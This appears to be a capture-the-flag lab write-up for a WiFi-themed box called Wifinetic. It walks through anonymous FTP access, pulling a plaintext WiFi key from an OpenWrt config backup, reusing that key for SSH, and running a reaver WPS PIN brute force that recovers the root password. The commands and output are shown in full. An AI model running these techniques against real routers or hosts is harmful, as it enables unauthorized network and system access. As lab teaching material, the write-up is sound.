---
description: Wifi Box!
---

# Wifinetic

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.68.239 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 18:57 +08
Nmap scan report for 10.129.68.239
Host is up (0.020s latency).
Not shown: 52717 closed tcp ports (conn-refused), 12815 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain
```

FTP is open, so we should check for anonymous access.

### Anonymous FTP --> Wifi Password --> SSH

There were quite a few files within this FTP server:

```
$ ftp 10.129.68.239                                               
Connected to 10.129.68.239.
220 (vsFTPd 3.0.3)
Name (10.129.68.239:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44452|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
```

The most interesting is the `.tar` file that contained a backup of some sorts. When we download this and extract the files, it shows that this is the `/etc/` file:

```
$ tar -xf backup-OpenWrt-2023-07-26.tar
$ cd etc
$ ls
config    group  inittab       nftables.d  passwd   rc.local  shinit       uhttpd.crt
dropbear  hosts  luci-uploads  opkg        profile  shells    sysctl.conf  uhttpd.key
```

Within the `/etc/config` file, there was a `wireless` file. Since this was a Wifi themed box, I read the file and found a password:

```
$ cat wireless 

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
```

The question now is whether the box is transmitting stuff over the air, or if there's a user that uses this password. Reading the `passwd` file shows us a few users:

```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

The `netadmin` user reused it:

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Enumeration

Since this is a Wifi box, we can check `ifconfig` for the interfaces available:

```
netadmin@wifinetic:/opt/share$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.68.239  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb9:501e  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:501e  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:50:1e  txqueuelen 1000  (Ethernet)
        RX packets 199994  bytes 14812436 (14.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 199850  bytes 10858403 (10.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 862  bytes 53092 (53.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 862  bytes 53092 (53.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 6865  bytes 1209922 (1.2 MB)
        RX errors 0  dropped 6865  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 229  bytes 21998 (21.9 KB)
        RX errors 0  dropped 31  overruns 0  frame 0
        TX packets 288  bytes 33715 (33.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 82  bytes 10771 (10.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 229  bytes 26120 (26.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

There's a `mon0` interface listening, and checking `iwconfig` shows that it is in Monitor mode:

```
netadmin@wifinetic:/opt/share$ iwconfig
wlan2     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
eth0      no wireless extensions.

wlan1     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
lo        no wireless extensions.

wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
hwsim0    no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

Interesting. There wasn't much else I could do, so I ran `linpeas.sh` to enumerate for me, and it found `reaver`, a program I wasn't familiar with:

```
Files with capabilities:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

This tool can be used to brute force Wifi passwords out. Using this tool, combined with our Monitor mode `mon0` interface, we can start sniffing stuff from `wlan0` and `wlan1`. We can grab the ether value and feed it into `reaver`:

```
netadmin@wifinetic:/tmp$ reaver -i mon0 -b 02:00:00:00:00:00 -v

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
```

Afterwards, we can `su` to `root`:

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
